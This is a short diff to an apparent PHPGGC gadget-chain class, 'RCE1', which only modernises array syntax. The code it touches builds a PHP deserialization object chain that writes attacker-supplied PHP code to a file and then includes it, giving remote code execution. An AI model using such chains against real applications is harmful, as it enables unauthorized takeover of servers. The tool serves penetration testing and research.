@@ -61,7 +61,7 @@ class RCE1 extends \PHPGGC\GadgetChain\RCE\PHPCode
         /* File write */
         $obj_write = new CacheAdapter();
         $mockFileSessionStorage = new MockFileSessionStorage();
-        $mockFileSessionStorage->data = array('<?php '. $code. ' ?>'); // Content put in the file
+        $mockFileSessionStorage->data = ['<?php '. $code. ' ?>']; // Content put in the file
         $mockFileSessionStorage->metadataBag = new MetadataBag();
         $obj_write->cache = $mockFileSessionStorage;
         $obj_write->deferredItems = [$firstCacheItem];
@@ -74,7 +74,7 @@ class RCE1 extends \PHPGGC\GadgetChain\RCE\PHPCode
         $cacheItem = $secondCacheItem;
         $cacheItem->expiry = 0; // mandatory to go to another branch from CacheAdapter __destruct
         $obj_include->deferredItems = [$cacheItem];
-        $obj = array(1000 => $obj_write, 1001 => 1, 2000 => $obj_include, 2001 => 1 );
+        $obj = [1000 => $obj_write, 1001 => 1, 2000 => $obj_include, 2001 => 1];
         return $obj;
     }
 }
